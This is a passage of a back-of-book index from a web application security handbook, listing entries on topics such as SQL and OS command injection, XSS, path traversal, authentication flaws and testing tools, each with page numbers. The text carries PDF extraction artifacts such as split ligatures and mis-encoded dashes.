vulnerabilities, hacker‚Äôs 
methodology, 836‚Äì841
fuzzing, 572‚Äì573
Burp Intruder, 600‚Äì602
hacker‚Äôs methodology, 
parameter, 824‚Äì827
integrated testing suites, 
762‚Äì763
JAttack, 588‚Äì590
objective, 586‚Äì587
strings, 587
G
general headers, 45
generic error messages, 628
GET method, 42
purpose, 264
GET request, 40
XSS converting, 474‚Äì475
getCurrentUserRoles
method, 261
GIFAR fi les, 485‚Äì486
Google, 89
Omitted Results, 90
querying, 90
Google Translate (GT), 530‚Äì531
Gray Hat Hacking (Eagle & Harris 
& Harper & Ness), 634
GT. See Google Translate
H
hacker‚Äôs methodology
access controls
insecure access, 823
limited access, 822‚Äì823
multiple accounts, 822
requirements, 821
analysis
attack surface mapping, 800
data entry points, 799
functionality, 798‚Äì799
technologies, 799‚Äì800
application logic fl aws
attack surface, 842
incomplete input, 843
multistage functions, 
842‚Äì843
transaction logic, 844
trust relationships, 844
application mapping, 795‚Äì798
debug parameters, 798
default content, 797
enumerating identifi ers, 
797‚Äì798
hidden content, 796‚Äì797
public information resources, 
796
of tokens to sessions, 818
visible content, 795‚Äì796
authentication
application logic fl aws, 
811‚Äì813
credentials, autogenerated, 
809‚Äì810
credentials, unsafe 
distribution, 810‚Äì811
credentials, unsafe 
transmission, 810
impersonation, 808‚Äì809
insecure web storage, 811
password guessing, 807
password quality, 806
password recovery, 807‚Äì808
‚Äúremember me‚Äù functions, 
808
understanding, 805
username enumeration, 
806‚Äì807
username uniqueness, 809
vulnerability exploitation for 
unauthorized access, 
813
back-end request injection, 841
browser extensions, 802‚Äì804
ActiveX controls, 804
debugger, 803‚Äì804
decompiling, 802‚Äì803
buffer overfl ow, 837‚Äì838
client-side
data transmission, 801
user input, 801‚Äì802
cookie scope, 820‚Äì821
CSRF, 820
DOM, 849‚Äì850
fi le inclusion, 835‚Äì836
format string vulnerabilities, 
838
fuzzing parameters, 824‚Äì827
guidelines, 793‚Äì794
HTTP header injection, 830
information leakage, 852
input-based vulnerabilities, 
824‚Äì836
function-specifi c, 836‚Äì841
integer vulnerabilities, 838
LDAP injection, 839‚Äì840
local privacy attacks, 850‚Äì851
miscellaneous checks, 849‚Äì852
native software bugs, 837‚Äì838
open redirection 
vulnerabilities, 830‚Äì831
OS command injection, 
832‚Äì833
path traversal vulnerabilities, 
833‚Äì835
refl ected XSS, 829‚Äì830
same-origin policy, 851‚Äì852
bindex.indd 863 bindex.indd 863 8/19/2011 12:01:36 PM 8/19/2011 12:01:36 PM
Stuttard bindex.indd V1 - 08/13/2011 Page 864
864 Index n H‚ÄìH
script injection, 835
session management
token insecure transmission, 
817
token system log disclosure, 
817‚Äì818
tokens tested for meaning, 
815‚Äì816
tokens tested for 
predictability, 816‚Äì817
understanding, 814‚Äì815
sessions
fi xation, 819
terminating, 818‚Äì819
shared hosting, 845‚Äì846
SMTP injection, 836‚Äì837
SOAP injection, 839
SQL injection, 827‚Äì829
stored procedures, 831‚Äì832
weak SSL ciphers, 851
web servers, 846‚Äì849
dangerous HTTP methods, 
847
default content, 847
default credentials, 846
native software bugs, 848
proxy server functionality, 
847
virtual hosting, 847‚Äì848
WAFs, 848‚Äì849
work areas, 791‚Äì793
XPath injection, 840‚Äì841
XXE injection, 841
hacker‚Äôs toolkit, 747
custom scripts, 786‚Äì789
Curl, 788
Netcat, 788‚Äì789
Stunnel, 789
Wget, 788
Firebug, 785
Hydra, 785‚Äì786
integrated testing suites, 
751‚Äì773
components, 752‚Äì769
types, 751
Nikto, 785
web browsers, 748‚Äì750
Chrome, 750
Firefox, 749‚Äì750
IE, 748‚Äì749
Wikto, 785
Hammad, Sherief, 322
Harper, Allen, 634
Harris, Shon, 634
HEAD functions, 43
HEAD method, 265
heap overfl ows, 635‚Äì636
Heasman, John, 634
hex encoding, 69‚Äì70
hidden content
discovering, 80‚Äì93
brute-force techniques, 81‚Äì85
inference from published 
content, 85‚Äì89
Nikto, 93
public information, 89‚Äì91
user-directed spidering, 
81‚Äì83
web server leveraged for, 
91‚Äì93
Wikto, 92‚Äì93
hacker‚Äôs methodology, 
application mapping, 
796‚Äì797
hidden HTML form fi elds
client-side data transmission 
with, 118‚Äì120
intercepting proxy modifying, 
119‚Äì120
hidden parameters, application 
mapping, 96‚Äì97
hijacking
JavaScript, 519‚Äì520
E4X, 523‚Äì524
function callbacks, 520
JSON, 521
preventing, 524
variable assignment, 522
sessions, 436
Holyfi eld, Brian, 138
horizontal access controls, 
258
horizontal privilege escalation, 
259, 416
Host header, 41
hosting. See shared hosting
HP OpenView, 359
HPI. See HTTP parameter 
injection
HPP. See HTTP parameter 
pollution
HTML. See hypertext markup 
language
HTML5
Ajax, 487
event handlers, 458
local privacy attacks, 554
same-origin policy, 528‚Äì529
script pseudo-protocols, 458
web functionality, 64‚Äì65
HTTP. See hypertext transfer 
protocol
HTTP header injection
causes, 531‚Äì532
cookies, 533
exploiting, 532‚Äì535
attackers, 534‚Äì535
hacker‚Äôs methodology, 830
HTTP response splitting, 
534‚Äì535
input validation, 536
preventing, 536
HTTP parameter injection (HPI), 
390
causes, 393‚Äì394
HPP, 394‚Äì395
HTTP parameter pollution (HPP)
client-side, 548‚Äì550
HPI, 394‚Äì395
HTTPRECON, 102
HTTPS, 49
integrated testing suites, 
intercepting proxies, 
755‚Äì758
login function, 170
man-in-the-middle attacks, 
566‚Äì568
proxy servers, 50
session tokens, 234‚Äì236, 250
HTTPWatch tool, IE, 748
Hydra, 785‚Äì786
hyperlinks, web functionality, 58
hypertext markup language 
(HTML). See also HTML5
ActiveX controls modifi cation, 
557
bypassing fi lters, 459‚Äì465
attribute delimiters, 461‚Äì462
attribute names, 461
attribute values, 462
character sets, 464‚Äì465
tag brackets, 462‚Äì464
tag name, 460‚Äì461
encoding, 68‚Äì69
developer mistakes, 494‚Äì495
forms, 58‚Äì59
authentication, 160‚Äì161
client-side control of user 
input with, 127‚Äì133
client-side data transmission 
with hidden, 118‚Äì120
disabled elements, 131‚Äì133
intercepting proxy 
modifying hidden, 
119‚Äì120
length limits, 128‚Äì129
script-based validation, 
129‚Äì131
injection, cross-domain data 
capture, 516‚Äì517
refl ected XSS limiting, 495‚Äì496
script code introduced in
dynamically evaluated CSS 
styles, 459
event handlers, 457‚Äì458
script pseudo-protocols, 458
scripttags, 457
bindex.indd 864 bindex.indd 864 8/19/2011 12:01:36 PM 8/19/2011 12:01:36 PM
Stuttard bindex.indd V1 - 08/13/2011 Page 865
 Index n I‚ÄìI 865
stored XSS limiting, 495‚Äì496
tag pairs, XSS, 422
web functionality with, 58
hypertext transfer protocol 
(HTTP). See also HTTP header 
injection
access controls testing, 278
authentication, 50‚Äì51
sessions avoided with, 
208‚Äì209
benefi ts, 5
cookies, 19, 47
client-side data transmission, 
121
session management tokens, 
207‚Äì208, 234‚Äì236
fi ngerprinting, 102
hacker‚Äôs methodology, web 
servers, 847
headers
application mapping, input 
entry points, 100‚Äì101
general, 45
request, 45‚Äì46
response, 46
security assumptions, 123
HPI, 390
causes, 393‚Äì394
HPP, 394‚Äì395
client-side, 548‚Äì550
man-in-the-middle attacks, 
566‚Äì568
messages, 40‚Äì42
methods, 42‚Äì44
origins, 39
proxy servers, 49‚Äì50
requests, 40‚Äì41
dissecting, 107‚Äì108
input sources, 52
URL, 40, 42
responses, 41‚Äì42
splitting, 534‚Äì535
server-side redirection, 
390‚Äì392
exploiting, 391‚Äì392
SSL and, 49
status codes, 48‚Äì49
enumerating identifi ers, 574
TCP protocol, 40
hypothesis testing, statistical, 
219‚Äì222
I
ID fi eld, 295
IDA Pro, 153
iDefense, 558
identifi er-based functions
access controls, 261‚Äì262
application logs, 262
identifi ers. See enumerating 
identifi ers
IE. See Internet Explorer
IEWatch tool, 79, 748
If-Modified-Since, 128‚Äì129
If-None-Match, 128‚Äì129
iframe, 511‚Äì515
IIS, Microsoft
error messages, 628
ISAPI extensions, 688
path traversal vulnerabilities, 
691‚Äì692
impersonation, authentication, 
178‚Äì180
hacker‚Äôs methodology, 808‚Äì809
in-band delivery, XSS, 449‚Äì450
inducing actions, 501
request forgery
CSRF, 8, 244, 251, 504‚Äì511
OSRF, 502‚Äì503
UI redress attacks, 508, 511‚Äì515
basic form, 511‚Äì513
framebusting, 514‚Äì515
mobile devices, 515
preventing, 515
variations, 513
XSS attack payloads, 445‚Äì446
inference
information disclosure, 
626‚Äì627
search engines, 626
SQL injection, 319‚Äì324
infi nite loops, 29
information disclosure
error messages, 615‚Äì625
generic, 628
inference, 626‚Äì627
leaks
client-side, 629
preventing, 627‚Äì629
protecting, 628‚Äì629
published content, 625
information leakage, 8
authentication preventing, 
195‚Äì196
hacker‚Äôs methodology, 852
information disclosure
client-side, 629
preventing, 627‚Äì629
information_schema, 309‚Äì310
initialization vector (IV), 685
injection
back-end request, 841
client-side, 531‚Äì550
SQL, 547‚Äì548
code, 288
cookie
attacker methods, 536‚Äì537
session fi xation, 537‚Äì540
CSS, cross-domain data 
capture, 517‚Äì519
e-mail header, 398‚Äì399
HPI, 390
causes, 393‚Äì394
HTML, cross-domain data 
capture, 516‚Äì517
HTTP header
attackers exploiting, 534‚Äì535
causes, 531‚Äì532
cookies, 533
exploiting, 532‚Äì535
hacker‚Äôs methodology, 830
HTTP response splitting, 
534‚Äì535
input validation, 536
output validation, 536
preventing, 536
interpreted language, 288‚Äì290
LDAP, 349‚Äì354
conjunctive queries fi lters, 
352‚Äì353
exploiting, 351‚Äì353
fl aws, 353‚Äì354
hacker‚Äôs methodology, 
839‚Äì840
preventing, 354
vulnerabilities, 350‚Äì351
login function bypassed, 
288‚Äì290
NoSQL, 342‚Äì344
MongoDB, 343‚Äì344
OS commands, 358‚Äì368
ASP.net, 360‚Äì361
dynamic code execution, 362
dynamic code execution, 
vulnerabilities, 366‚Äì367
fl aws, 363‚Äì366
hacker‚Äôs methodology, 
832‚Äì833
metacharacters, 420
Perl language, 358‚Äì360
preventing, 367‚Äì368
shell metacharacters, 363, 365
source code, 708
spaces, 366
time delay, 363‚Äì364
script
hacker‚Äôs methodology, 835
preventing vulnerabilities, 
368
SMTP, 397‚Äì402
fl aws, 400‚Äì401
hacker‚Äôs methodology, 
836‚Äì837
preventing, 402
SOAP, 386‚Äì388
banking application, 387‚Äì388
bindex.indd 865 bindex.indd 865 8/19/2011 12:01:36 PM 8/19/2011 12:01:36 PM
Stuttard bindex.indd V1 - 08/13/2011 Page 866
866 Index n J‚ÄìJ
error messages, 388
fi nding and exploiting, 389
hacker‚Äôs methodology, 839
preventing, 27, 390
SQL, 7, 14
advanced exploitation, 
314‚Äì324
API methods, 291
application logic fl aws, 
420‚Äì422
blind, 626
bugs, 298‚Äì302
client-side, 547‚Äì548
column name, 301‚Äì302
conditional errors, 320‚Äì322
database code components, 
741‚Äì742
defense in depth, 342
DELETE statements, 297‚Äì298
double hyphen, 293
error messages, 334‚Äì338
exploitation tools, 328‚Äì331
fi lter bypassing, 311‚Äì313
fi ngerprinting databases, 
303‚Äì304
hacker‚Äôs methodology, 
827‚Äì829
inference, 319‚Äì324
input validation 
circumvented, 312
INSERT statements, 295‚Äì296
JavaScript errors, 299
numeric data, 299‚Äì301, 
315‚Äì316
ORDER BY clause, 301‚Äì302
out-of-band channel, 316‚Äì319
parameterized queries, 
339‚Äì341
preventing, 27, 338‚Äì342
query structure, 301‚Äì302
second-order, 313‚Äì314
SELECT statements, 294‚Äì295
source code, 705‚Äì706
string data, 298‚Äì299
syntax, 332‚Äì334
time delays, 322‚Äì324
UNION operator, 304‚Äì308
UNION operator data 
extraction, 308‚Äì311
UPDATE statements, 296‚Äì297
URL encoding, 300‚Äì301
vulnerability exploitation, 
292‚Äì294
Trojan, XSS attack payloads, 
444‚Äì445
XML, 383‚Äì390
XXE, 384‚Äì386, 841
XPath, 344‚Äì349
blind, 347‚Äì348
fl aws, 348‚Äì349
hacker‚Äôs methodology, 
840‚Äì841
informed, 346‚Äì347
preventing, 349
input. See also user input
‚Äúaccept known good‚Äù 
approach, 24
application mapping, entry 
points for
HTTP headers, 100‚Äì101
out-of-band channels, 101
request parameters, 99
URL fi le paths, 98‚Äì99
blog applications, 22
boundary validation, 25‚Äì28, 
313
canonicalization, 28‚Äì29
defense mechanisms, 21‚Äì29
approaches to, 23‚Äì25
fi lters, path traversal 
vulnerabilities, 374‚Äì377
hacker‚Äôs methodology, 
application logic fl aws 
and incomplete, 843
insertion, stored XSS, refl ected 
XSS eliminating 
dangerous, 495
multistep validation, 28‚Äì29
‚Äúreject known bad‚Äù approach, 
23‚Äì24
safe data handling approach, 
25
sanitization approach, 24‚Äì25
semantic checks, 25
validation, 21‚Äì22, 313
application logic fl aws 
invalidating, 420‚Äì422
circumventing, 312
DOM-based XSS, 497
HTTP header injection, 536
problems, 26
stored XSS, refl ected XSS, 
492‚Äì493
varieties, 21‚Äì23
input-based vulnerabilities, 
hacker‚Äôs methodology, 
824‚Äì836
function-specifi c, 836‚Äì841
INSERT statements
SQL injection, 295‚Äì296
WHERE clause, 295
insurance, application logic 
fl aws, 412‚Äì413
integer vulnerabilities
causes, 640
detecting, 642‚Äì643
hacker‚Äôs methodology, 838
overfl ows, 640‚Äì641
signedness errors, 641‚Äì642
source code, 709‚Äì710
integrated testing suites
fuzzing, 762‚Äì763
hacker‚Äôs toolkit, 751‚Äì773
components, 752‚Äì769
types, 751
intercepting proxies
alternatives, 771‚Äì773
common features, 758‚Äì759
HTTPS, 755‚Äì758
web browser confi guration, 
752‚Äì755
manual request tools, 765‚Äì767
shared functions and utilities, 
768‚Äì769
shared token analyzers, 767
Tamper Data, 772
TamperIE, 772‚Äì773
vulnerability scanners, 764‚Äì765
standalone, 773‚Äì784
web spidering, 760‚Äì762
work fl ow, 769‚Äì771
intercepting proxies
evolution, 751
integrated testing suites
alternatives, 771‚Äì773
common features, 758‚Äì759
HTTPS, 755‚Äì758
web browser confi guration, 
752‚Äì755
Internet. See World Wide Web
Internet Explorer (IE), 239, 459
anti-XSS fi lters, 748
error messages, 622
HTTPWatch tool, 748
IEWatch tool, 79, 748
refl ected XSS, 435
TamperIE, 772‚Äì773
userData, 554
web application hacker‚Äôs 
toolkit, 748‚Äì749
XSS fi lter, 479‚Äì481
Internet forums, public 
information, 91
interpreted language injection, 
288‚Äì290
IP address availability, 100
IV. See initialization vector
J
Jad, Java, 141
decompiling, 148‚Äì150
.jad fi les, 148‚Äì150
.jar fi les, 141
JAttack
bindex.indd 866 bindex.indd 866 8/19/2011 12:01:36 PM 8/19/2011 12:01:36 PM
Stuttard bindex.indd V1 - 08/13/2011 Page 867
 Index n K‚ÄìL 867
data harvesting, 585‚Äì586
enumerating identifi ers, 
577‚Äì583
extract function, 598
fuzzing, 588‚Äì590
strength, 590
Java
API methods
database access, 714‚Äì715
dynamic code execution, 715
fi le access, 713
OS command execution, 
715‚Äì716
potentially dangerous, 
713‚Äì716
sockets, 716
URL redirection, 716
applets, 134
decompiling browser 
extensions, 146‚Äì150
bytecode, 141
debuggers, 151‚Äì152
error messages, 628
Jad, 141
decompiling, 148‚Äì150
same-origin policy, 527
security confi guring, 716‚Äì717
serialized data, 136‚Äì137
session interaction, 712‚Äì713
terminology, 53
tiered architectures, 648
user input, 711‚Äì712
API methods, 712
web container, 53
web functionality, 53‚Äì54
Java Servlet, 53
Java Virtual Machine (JVM), 134
web server software 
vulnerabilities, 690
java.io.File, 713
java.net.Socket, 716
JavaScript
browsing history stolen with, 
560
client-side, validation with, 
130‚Äì131, 156
decompiling browser 
extensions, original 
bytecode manipulation, 
144
DOM, 440
DOM-based API methods, 740
escaping, script code 
bypassing fi lters, 465‚Äì466
hijacking, 519‚Äì520
E4X, 523‚Äì524
function callbacks, 520
JSON, 521
preventing, 524
variable assignment, 522
$js function, 344
length limits, 471
logging keystrokes, 560
open redirection 
vulnerabilities, 546
port scanning, 561, 566
script code bypassing fi lters 
using VBScript and, 
467‚Äì468
SQL injection, errors in, 299
third-party applications 
currently used, 560‚Äì561
web functionality, 61
XSS, 436‚Äì438
XSS exploits executing, in XML 
responses, 478‚Äì479
JavaScript Object Notation 
(JSON)
cross-domain requests, 
477
JavaScript hijacking, 521
web functionality, 63
JavaSnoop, 151‚Äì152
JBoss Application Server, 
674‚Äì676
Jetty, 218
Dump Servlet, 672
Jitko worm, 530‚Äì531
$js function, JavaScript, 344
JMX, 674‚Äì676
JRun, Allaire, 690‚Äì691
JSON. See JavaScript Object 
Notation
.jsp fi le extension, 107
JSwat, 151‚Äì152
JVM. See Java Virtual Machine
K
Kamkar, Samy, 219
keystrokes, logging, 560
Klein, Amit, 248
L
LAMP server, 650‚Äì651, 666
languages. See interpreted 
language
lazy load approach, data 
transmission, 626
LDAP. See Lightweight Directory 
Access Protocol
leaks. See information leakage
length limits
JavaScript, 471
refl ected XSS, 471‚Äì473
Ley, Jim, 444
Lightweight Directory Access 
Protocol (LDAP)
fi lters, 350
injection, 349‚Äì354
conjunctive queries fi lters, 
352‚Äì353
disjunctive queries fi lters, 351
exploiting, 351‚Äì353
fl aws, 353‚Äì354
hacker‚Äôs methodology, 
839‚Äì840
preventing, 354
vulnerabilities, 350‚Äì351
uses, 349‚Äì350
Linder, Felix, 634
Litchfi eld, David, 320, 327, 693
LOAD_FILE command, 328
local fi le inclusion, 382
tiered architectures, 652‚Äì654
local privacy attacks
autocomplete, 552
browsing history, 552
Flash LSOs, 553
hacker‚Äôs methodology, 850‚Äì851
HTML5, 554
IE userData, 554
persistent cookies, 550
preventing, 554‚Äì555
Silverlight Isolated Storage, 553
testing, 550
Local Shared Objects (LSOs), 553
Location header, 531‚Äì532
enumerating identifi ers, 575
location-based access controls, 
266
logging keystrokes, 560
logic. See application logic fl aws
login function, 18‚Äì19, 160
account suspension, 197‚Äì198
application logic fl aws, 426‚Äì427
race conditions, 427
attackers, 164‚Äì165
authentication
brute-forcible, 162‚Äì165
verbose failure messages, 
166‚Äì169
concurrent, 250
cookies, 163
fail-open, 185‚Äì186, 194
HTTPS, 170
injection bypassing, 288‚Äì290
multistage, 186‚Äì190, 194‚Äì195
attackers, 188
common myth, 187
purpose, 186‚Äì187
random questions, 189‚Äì190, 
194‚Äì195
secondary challenge, 173, 200
bindex.indd 867 bindex.indd 867 8/19/2011 12:01:36 PM 8/19/2011 12:01:36 PM
Stuttard bindex.indd V1 - 08/13/2011 Page 868
868 Index n M‚ÄìO
secret questions, 189
session management, 206
tokens, 539‚Äì540
timing differences, 168‚Äì169
username enumeration, 
166‚Äì169
logout function, session 
management, 242, 250
logs. See system log disclosure, 
session tokens
LSOs. See Local Shared Objects
M
macros, request, 604‚Äì606
magic_quotes-gpc directive, 
734
mail() command, 398‚Äì399
mail services. See e-mail; SMTP 
injection
man-in-the-middle attacks, 
566‚Äì568
manual request tools, integrated 
testing suites, 765‚Äì767
mapping. See application 
mapping
Mavituna, Ferruh, 566
McDonald, John, 634
meaningful token attackers, 212
memory management, web 
server software, 687‚Äì689
metacharacters, OS command 
injection, 420. See also shell 
metacharacters
Microsoft. See also Internet 
Explorer
Asirra puzzles, 612
IIS
error messages, 628
ISAPI extensions, 688
path traversal vulnerabilities, 
691‚Äì692
security, 431‚Äì432
SiteLock Active Template 
Library, 559
mobile devices
applications, 4
UI redress attacks, 515
mod_isapi, Apache, 688
mod_proxy, Apache, 688
MongoDB, NoSQL injection, 
343‚Äì344
MOVE method, 679‚Äì680
MS-SQL databases
attackers, 326‚Äì327
automated exploitation, 330
batch queries, 317
default lockdown, 326‚Äì327
error messages, 334‚Äì338
out-of-band channels, 317
syntax, 332‚Äì334
WAITFOR command, 322‚Äì323
multistage functions
access controls, 262‚Äì263
testing, 271‚Äì273
banking application, 263
hacker‚Äôs methodology, 
application logic fl aws, 
842‚Äì843
login, 186‚Äì190, 194
attackers, 188
common myth, 187
purpose, 186‚Äì187
random questions, 189‚Äì190, 
194‚Äì195
multistep validation, input, 
28‚Äì29
MySpace, stored XSS, 442‚Äì443, 
446
MySQL
attackers, 328
comments, 303‚Äì304, 312
double hyphen, 293
error messages, 334‚Äì338
out-of-band channels, 319
path traversal vulnerabilities, 
651
sleep function, 323
syntax, 332‚Äì334
tiered architectures extracting, 
650‚Äì652
UDFs, 328
N
naming schemes
application mapping, 85‚Äì86
brute-force exercise, 88
identifying, 87
static resources, 87
native client components, 153
native compiled applications
buffer overfl ow, 634‚Äì640
examples, 633
format string vulnerabilities, 
643‚Äì644
integer vulnerabilities, 640‚Äì643
testing for, 633‚Äì634
native software bugs
hacker‚Äôs methodology, 837‚Äì838
web servers, 848
source code, 709‚Äì710
NBFS. See .NET Binary Format 
for SOAP
negative price method, 120
Ness, Jonathan, 634
.NET
encryption, 686
padding oracle, 685‚Äì687
.NET Binary Format for SOAP 
(NBFS), 138
Netcat, 788‚Äì789
NETGEAR router, 562
network disclosure, session 
tokens, 234‚Äì237
network hosts, attackers, 561‚Äì562
network perimeter, web 
application security and new, 
12‚Äì14
nextPayload method, 578
NGSSoftware, 640
Nikto
hacker‚Äôs toolkit, 785
hidden content, 93
maximizing effectiveness, 797
non-HTTP services, 562‚Äì563
NoSQL
advantages, 343
data stores, 342‚Äì343
injection, 342‚Äì344
MongoDB, 343‚Äì344
notNetgear function, 562
nslookup command, 365
NTLM protocol, 50
NULL bytes
attackers, 23‚Äì24
WAFs, 460
XSS, 460
NULL value, 306‚Äì307
numeric data
limits, 417
SQL injection into, 299‚Äì301, 
315‚Äì316
O
obfuscation
bytecode, decompiling browser 
extensions, 144‚Äì146
custom schemes, 109
OCR. See optical character 
recognition
ODBC. See open database 
connectivity
off-by-one vulnerabilities, 
636‚Äì638
OllyDbg, 153
Omitted Results, Google, 90
100 Continue, 48
on-site request forgery (OSRF), 
502‚Äì503
onsubmit attributes, 130
opaque data
attackers, 124
bindex.indd 868 bindex.indd 868 8/19/2011 12:01:36 PM 8/19/2011 12:01:36 PM
Stuttard bindex.indd V1 - 08/13/2011 Page 869
 Index n P‚ÄìP 869
client-side data transmission, 
123‚Äì124
open database connectivity 
(ODBC), 624
open redirection vulnerabilities
causes, 540‚Äì541
fi nding and exploiting, 
542‚Äì546
hacker‚Äôs methodology, 830‚Äì831
JavaScript, 546
preventing, 546‚Äì547
rickrolling attacks, 541
source code, 707‚Äì708
URLs, 542
absolute prefi x, 545‚Äì546
blocking absolute, 544‚Äì545
user input, 543‚Äì544
OpenLDAP, 352
operating system commands (OS 
commands)
ASP.NET API methods, 
722‚Äì723
injection, 358‚Äì368
ASP.net, 360‚Äì361
dynamic code execution, 
362
dynamic code execution, 
vulnerabilities, 366‚Äì367
fl aws, 363‚Äì366
hacker‚Äôs methodology, 
832‚Äì833
metacharacters, 420
Perl language, 358‚Äì360
preventing, 367‚Äì368
shell metacharacters, 363, 365
source code, 708
spaces, 366
time delay, 363‚Äì364
Java API methods, 715‚Äì716
Perl language API methods, 
738
PHP API methods, 731
optical character recognition 
(OCR), 611
OPTIONS functions, 43
OPTIONS method, 679‚Äì680
OPTIONS request, 528
Oracle
databases
attackers, 327
11g, 318
error messages, 334‚Äì338
out-of-band channels, 
317‚Äì318
syntax, 332‚Äì334
time delays, 323‚Äì324
UNION operator, 307‚Äì308
PL/SQL Exclusion List, 
676‚Äì677
web server software fi lter 
bypass, 692‚Äì694
web server, 676‚Äì677
The Oracle Hacker‚Äôs Handbook
(Litchfi eld), 693
oracles. See encryption oracle
ORDER BY clause, 295
SQL injection, 301‚Äì302
Origin headers, 528‚Äì529
OS commands. See operating 
system commands
OSRF. See on-site request forgery
other user attackers, 431‚Äì432
out-of-band channels
application mapping, input 
entry points, 101
MS-SQL databases, 317
MySQL, 319
Oracle databases, 317‚Äì318
SQL injection, 316‚Äì319
unavailable, 319
out-of-band delivery, XSS, 450
output validation
DOM-based XSS, 497‚Äì498
HTTP header injection, 536
stored XSS, refl ected XSS, 
493‚Äì495
P
padding oracle
attack, 626
.NET, 685‚Äì687
pageid parameter, 598
parameter-based access controls, 
265‚Äì266
parameterized queries
provisos, 341
SQL injection, 339‚Äì341
parameters
application mapping, input 
entry points, 99
hidden, application mapping, 
96‚Äì97
URL, client-side data 
transmission, 121‚Äì122
parseResponse method, 585, 
589
passive scanning, 764‚Äì765
passwords
access controls attackers 
harvesting, 275‚Äì276
backdoor, 178‚Äì179
source code, 708
brute-force techniques for 
wiki, 424
change functionality, 171‚Äì172, 
193
application logic fl aws, 
409‚Äì410
misuse, 199
username, 172
cleartext storage, 190‚Äì191
forgotten, 14, 584
functionality, 173‚Äì175
guessing, 160
techniques, 163‚Äì164
hacker‚Äôs methodology, 
authentication
guessing, 807
quality, 806
recovery function, 807‚Äì808
hints, 174, 200
predictable initial, 183
real-world, 163
recovery
challenges, 173‚Äì174
hacker‚Äôs methodology, 
authentication, 807‚Äì808
hints, 200
misuse, 199‚Äì200
secondary challenge, 200
time-limited URLs, 174‚Äì175
requirements, 192
resetting, 175
system-generated, 192
truncated, 180‚Äì181
weak, 161‚Äì162
path restriction cookies, 247‚Äì248
path traversal vulnerabilities
Apple iDisk Server, 690
application mapping, 371
attackers
circumventing obstacles, 
374‚Äì377
successful, 374
targets, 370‚Äì371
causes, 368‚Äì369
chrooted fi le system, 380‚Äì381
custom encoding, 377‚Äì378
detecting, 372‚Äì374
initial testing, 372
exploiting, 379
fi nding, 370‚Äì378
hacker‚Äôs methodology, 833‚Äì835
input fi lters, 374‚Äì377
Microsoft IIS, 691‚Äì692
MySQL, 651
preventing, 379‚Äì381
source code, 706‚Äì707
subtlety, 370
UNIX compared to Windows, 
374
bindex.indd 869 bindex.indd 869 8/19/2011 12:01:36 PM 8/19/2011 12:01:36 PM
Stuttard bindex.indd V1 - 08/13/2011 Page 870
870 Index n Q‚ÄìR
user input, 379‚Äì380
Payment Card Industry (PCI), 7
Perl language
API methods
database access, 737‚Äì738
dynamic code execution, 738
fi le access, 737
OS command execution, 738
potentially dangerous, 
736‚Äì739
sockets, 739
URL redirection, 738
eval function, 362
OS command injection via, 
358‚Äì360
security confi guration, 739‚Äì740
session interaction, 736
shell metacharacters, 360
user input, 735‚Äì736
per-page tokens, 252‚Äì253
persistent cookies, 550
phishing attacks, 541, 707
PHP
API methods
database access, 729‚Äì730
dynamic code execution, 
730‚Äì731
fi le access, 727‚Äì729
OS command execution, 731
potentially dangerous, 
727‚Äì732
sockets, 732
URL redirection, 731‚Äì732
eval function, 362
fi le inclusion vulnerabilities, 
381‚Äì382
mail() command, 398‚Äì399
safe mode, 666
security confi guration, 732‚Äì735
magic_quotes-gpc
directive, 734
register_globals
directive, 733
safe_mode directive, 
733‚Äì734
session interaction, 727
tiered architectures, 653‚Äì654
user input, 724‚Äì727
web functionality, 54‚Äì55
.php fi le extension, 108
phpinfo.php, 672
ping command, 364
PKC # 5 padding, 685
CBC, 686‚Äì687
Plain Old Java Object (POJO), 
53
PL/SQL Exclusion List, Oracle, 
676‚Äì677
web server software fi lter 
bypass, 692‚Äì694
POJO. See Plain Old Java Object
port scanning, Java Script, 561, 
566
POST method, 43, 192
purpose, 264
POST request
Content-Length header, 581
XSS converting, 474‚Äì475
PostgreSQL, 323
Pragma header, 42
predictable initial passwords, 
183‚Äì184
predictable tokens, 213‚Äì223
Burp Intruder, 213‚Äì214
concealed sequences, 213‚Äì215
time dependency, 215‚Äì217
weak random number
generation, 218‚Äì219
testing quality, 219‚Äì223
preg_replace function, 730
prepared statements, 339‚Äì341
privacy attacks. See local privacy 
attacks
privilege
data stores, 287
DBA, 325‚Äì326
escalation
horizontal, 258, 416
vertical, 258, 416
multilayered model
access controls security, 
280‚Äì283
attackers, 283
privs fi eld, 295
proceeding to checkout, 
application logic fl aws, 
410‚Äì411
programmatic access controls, 
282
PROPFIND method, 679
proxy history records, 769‚Äì771
proxy servers. See also
intercepting proxies
hacker‚Äôs methodology, web 
servers, 847
hidden HTML form 
modifi cation with 
intercepting, 119‚Äì120
HTTP, 49‚Äì50
HTTPS, 50
invisible, 138
web servers as, 682‚Äì683
proxy services
cross-domain data capture, 
529‚Äì531
GT, 530‚Äì531
Jitko worm, 530‚Äì531
public information
error messages, 623
hacker‚Äôs methodology, 
application mapping, 796
hidden content discovery with, 
89‚Äì91
Internet forums, 91
search engines for, 89
web archives for, 89‚Äì90
published content
error messages, 625
hidden content discovery with 
inference from, 85‚Äì89
information disclosure, 625
PUT functions, 43
PUT method, 679‚Äì680
Q
quantity parameter, 
restricting, 128
queries
CGI, 735‚Äì736
conjunctive fi lters, 350
LDAP injection, 352‚Äì353
disjunctive fi lters, 350
LDAP injection, 351
parameterized
provisos, 341
SQL injection, 339‚Äì341
search engines, 90
SELECT queries, UNION
operator, 304‚Äì305
structure, SQL injection, 
301‚Äì302
R
race conditions, 427
Rails 1.0, 55
RBAC. See role-based access 
control
real-world
application logic fl aws, 406‚Äì407
CSRF fl aw, 505
passwords, 163
XSS, 442‚Äì443
recompiling, source code to 
bytecode
within browser, 
142‚Äì143
outside browser, 143
bindex.indd 870 bindex.indd 870 8/19/2011 12:01:36 PM 8/19/2011 12:01:36 PM
Stuttard bindex.indd V1 - 08/13/2011 Page 871
 Index n S‚ÄìS 871
redirection attacks. See open 
redirection vulnerabilities
referer-based access controls, 266
Referrer header, 41‚Äì42
client-side data transmission, 
122
Firefox, 239
XSS exploiting via, 475‚Äì476
refl ected XSS, 434‚Äì438
Apache, 442
cookies, 437‚Äì438
delivering, 448‚Äì449
DOM XSS converted from, 
472‚Äì473
exploiting, 435‚Äì438, 474
fi lters
defensive, 455‚Äì456
sanitizing, 468‚Äì471
signature-based, 455‚Äì456
fi nding and exploiting, 452‚Äì481
hacker‚Äôs methodology, 829‚Äì830
IE, 435
length limits, 471‚Äì473
preventing, 492‚Äì496
HTML limitations, 495‚Äì496
input insertion, 495
input validation, 492‚Äì493
output validation, 493‚Äì495
